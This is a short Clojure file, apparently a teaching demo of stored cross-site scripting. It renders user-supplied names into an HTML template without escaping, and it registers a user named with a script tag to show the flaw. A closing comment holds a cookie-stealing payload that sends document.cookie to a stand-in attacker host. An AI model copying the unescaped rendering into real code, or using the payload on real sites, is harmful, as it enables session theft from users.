(def my-db (atom {}))

(defn add [username doc] (swap! my-db assoc-in [username] doc))
(defn uuid [] (java.util.UUID/randomUUID))

; allows any user
(defn register-new-user! [username name]
  (let [user-id (uuid)
        user {:id user-id :username username :name name}]
    (add username user)
    user-id))

(defn load-user [username]
  (println username @my-db)
  (get @my-db username))

(println (register-new-user! "matheus.bernardes" "Matheus Bernardes"))


(def public-profile-template "<html>
                          <head> <title>Welcome</title> </head>
                          <body>
                          <h1>{{NAME}} ({{USERNAME}})</h1>
                          </body>
                          </html>")

(defn replace-symbol [content [symbol-name symbol-value]]
  (let [key (str "{{" symbol-name "}}")]
    (clojure.string/replace content key symbol-value)))

(defn render-template [content symbols]
  ;(println "Render template")
  ;(println "Base content" content)
  (reduce replace-symbol content symbols))


(defn view-public-profile [username]
  (let [user (load-user username)]
    (println username user)
    (render-template public-profile-template {"USERNAME" (:username user)
                                              "NAME" (:name user)})))

(println "db")
(println @my-db)

(println (view-public-profile "matheus.bernardes"))

(println (register-new-user! "guilherme.silveira" "<script>alert('oi');</script>"))
(println @my-db)

(println (view-public-profile "guilherme.silveira"))


;
; '><script>document.location=
;'http://www.attacker.com/cgi-bin/cookie.cgi?
;foo='+document.cookie</script>'.
